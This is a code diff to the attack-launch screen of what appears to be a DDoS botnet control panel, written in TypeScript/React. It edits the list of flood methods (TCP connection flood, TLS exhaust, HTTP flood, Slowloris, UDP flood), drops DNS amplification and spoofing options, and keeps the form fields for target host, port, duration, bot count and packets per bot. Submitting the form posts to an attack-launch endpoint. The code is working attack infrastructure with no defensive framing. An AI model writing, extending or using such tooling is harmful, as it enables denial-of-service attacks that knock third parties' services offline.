@@ -11,13 +11,11 @@ interface Attack {
 }
 
 const METHODS = [
-  { id: 'MEGA', desc: 'UDP MEGA (max power)' },
-  { id: 'UDP', desc: 'UDP flood' },
-  { id: 'SYN', desc: 'SYN flood' },
-  { id: 'TLS_EXHAUST', desc: 'TLS exhaust (2000 conns)' },
+  { id: 'MEGA', desc: 'TCP connection flood (exhaust target FDs)' },
+  { id: 'TLS_EXHAUST', desc: 'TLS exhaust (2048 conns)' },
   { id: 'HTTP', desc: 'HTTP/HTTPS flood' },
   { id: 'SLOWLORIS', desc: 'Slowloris (512 conns)' },
-  { id: 'DNS_AMP', desc: 'DNS amplification' },
+  { id: 'UDP', desc: 'UDP flood (bandwidth-heavy)' },
 ];
 
 export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
@@ -25,7 +23,7 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
   const [attacks, setAttacks] = useState<Attack[]>([]);
   const [form, setForm] = useState({
     target_host: '', target_port: 80, method: 'MEGA', duration_secs: 60,
-    pps_per_bot: 100000, bot_count: 1, spoof_mode: 0, fragmentation: false, mega_mode: false,
+    pps_per_bot: 100000, bot_count: 1, mega_mode: false,
   });
   const [launching, setLaunching] = useState(false);
   const [err, setErr] = useState('');
@@ -58,7 +56,6 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
         mega_mode: form.method === 'MEGA' || form.mega_mode,
         slowloris: form.method === 'SLOWLORIS',
         tls_exhaust: form.method === 'TLS_EXHAUST',
-        dns_amp: form.method === 'DNS_AMP',
       };
       await api.post('/api/attacks/launch', payload);
       toast(`Attack launched → ${form.target_host}:${form.target_port}`, 'success');
